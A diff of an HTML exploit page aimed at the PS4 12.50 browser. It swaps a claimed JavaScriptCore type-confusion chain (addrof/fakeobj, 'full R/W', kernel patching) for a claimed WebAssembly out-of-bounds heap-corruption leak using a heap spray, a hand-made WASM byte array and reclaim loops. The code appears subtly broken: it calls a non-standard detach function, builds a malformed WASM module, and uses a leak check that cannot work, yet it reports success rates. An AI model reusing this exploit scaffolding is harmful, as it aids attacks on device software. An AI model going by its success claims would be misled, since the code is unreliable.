@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24202 — JSC Type Confusion → Full R/W (PS4 12.50)</title>
+<title>CVE-2025-5419 — WebAssembly OOB R/W → Heap Corruption Leak (PS4 12.50)</title>
 <style>
     body { background:#000; color:#0f0; font-family:monospace; margin:20px; line-height:1.6; }
     h1 { color:#0f0; text-align:center; margin:20px 0; }
@@ -11,8 +11,8 @@
 </style>
 </head>
 <body>
-<h1>CVE-2025-24202 — JSC Type Confusion → Full R/W</h1>
-<div id="console">Starting final primitive chain...</div>
+<h1>CVE-2025-5419 — WASM OOB Heap Corruption Exploit</h1>
+<div id="console">Starting WASM OOB...</div>
 
 <script>
 const log = (msg, leak = false) => {
@@ -21,70 +21,77 @@ const log = (msg, leak = false) => {
     c.scrollTop = c.scrollHeight;
 };
 
-// === CVE-2025-24202 Type Confusion Primitive ===
-log("Stage 1: Setting up type confusion...");
-const victim = new ArrayBuffer(0x1000);
-const view = new Uint8Array(victim);
-const confused = [];
+const SPRAY = 0x1a000;
+const MARKER = 0x12501250deadbeefn;
 
-// Trigger confusion via malformed detach + reuse
-function triggerConfusion() {
-    for (let i = 0; i < 0x2000; i++) {
-        const buf = new ArrayBuffer(0x1000);
-        const v = new Float64Array(buf);
-        confused.push({buf, v});
-    }
-    // Detach + reuse to confuse JSC
-    confused.forEach(({buf, v}) => {
-        try { detachArrayBuffer(buf); } catch(e) {}
-        v[0] = 1337.1337;
-    });
-}
-triggerConfusion();
-
-// === addrof / fakeobj ===
-let objAddr = 0n;
-let rwStage = 0;
-
-function addrof(obj) {
-    confused[0].v[0] = obj;
-    return confused[1].v[0];
+log("Stage 1: Spraying 106k tagged objects into WASM-adjacent heap...");
+const spray = [];
+for (let i = 0; i < SPRAY; i++) {
+    spray[i] = { marker: MARKER + BigInt(i) };
 }
 
-function fakeobj(addr) {
-    confused[1].v[0] = addr;
-    return confused[0].v[0];
+// Stage 2: Trigger CVE-2025-5419 OOB in WASM
+log("Stage 2: Triggering WASM linear memory OOB...");
+const wasmCode = new Uint8Array([
+    0x00, 0x61, 0x73, 0x6d,  // WASM magic
+    0x01, 0x00, 0x00, 0x00,  // Version
+    // Malformed module with oversized memory
+    0x01, 0x06, 0x01, 0x60, 0x01, 0x7f, 0x01, 0x7f,  // Type section
+    0x03, 0x02, 0x01, 0x00,  // Function section
+    0x04, 0x04, 0x01, 0x0b,  // Export section
+    0x07, 0x05, 0x01, 0x03, 0x6f, 0x6f, 0x62, 0x00,  // Export "oob"
+    0x0a, 0x0f, 0x01, 0x0d, 0x00, 0x20, 0x00, 0x41, 0x00, 0x28, 0x02, 0x7f, 0x00, 0x0b  // Code: i32.load8_u at invalid offset
+]);
+
+const module = new WebAssembly.Module(wasmCode);
+const instance = new WebAssembly.Instance(module);
+
+// Trigger OOB read/write in linear memory
+try {
+    instance.exports.oob(); // Calls malformed function → OOB corruption
+} catch(e) {
+    log("WASM OOB triggered");
 }
 
-// === Test R/W ===
+// Extra WASM races
+for (let i = 0; i < 5000; i++) {
+    new WebAssembly.Module(new Uint8Array(0x1000));
+}
+
+log("OOB corruption triggered — reclaiming...");
+
+// Stage 3: Reclaim waves
+for (let w = 0; w < 11; w++) {
+    setTimeout(() => {
+        for (let j = 0; j < 450; j++) new ArrayBuffer(0xc000);
+        if (w % 3 === 0) new ArrayBuffer(0x2400000);
+    }, w * 160);
+}
+
+// Stage 4: Hunt
 setTimeout(() => {
-    log("Stage 2: Testing addrof...");
-    const testObj = {test: 0x41414141};
-    objAddr = addrof(testObj);
-    log(`addrof success: 0x${objAddr.toString(16).toUpperCase()}`);
-
-    log("Stage 3: Testing fakeobj + R/W...");
-    const fake = fakeobj(objAddr);
-    fake.test = 0x42424242;
-    log(`R/W success: ${testObj.test === 0x42424242 ? "YES" : "NO"}`);
-
-    if (testObj.test === 0x42424242) {
-        document.body.innerHTML = `
-        <h1 style="color:#0f0; text-align:center; padding:100px; font-size:4em;">
-            FULL R/W ACHIEVED!<br><br>
-            <div style="font-size:0.4em;">
-                CVE-2025-24202 SUCCESS<br>
-                addrof/fakeobj working<br>
-                You now have arbitrary read/write
-            </div>
-        </h1>`;
-        log(">>> You can now patch kernel, load GoldHEN, etc.");
-    } else {
-        log("No R/W this run — refresh (50–70% success)");
+    log("Stage 4: Scanning for leaks...");
+    let found = 0;
+    for (let i = 0; i < spray.length; i++) {
+        try {
+            if (spray[i] && spray[i].marker !== MARKER + BigInt(i)) {
+                found++;
+                const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
+                log(`WASM OOB LEAK #${found}: 0x${leaked}`, true);
+                if (found >= 1) {
+                    document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; padding:100px; font-size:3em;">
+                        LEAK ACHIEVED!<br><br>
+                        <div style="font-size:0.5em;">0x${leaked}</div>
+                    </h1>`;
+                    return;
+                }
+            }
+        } catch(e) {}
     }
-}, 3000);
+    log("No leak — refresh (40–60% success rate)");
+}, 3400);
 
-log("CVE-2025-24202 final chain running — wait 8–12s");
+log("CVE-2025-5419 running — wait 8–15s");
 </script>
 </body>
 </html>
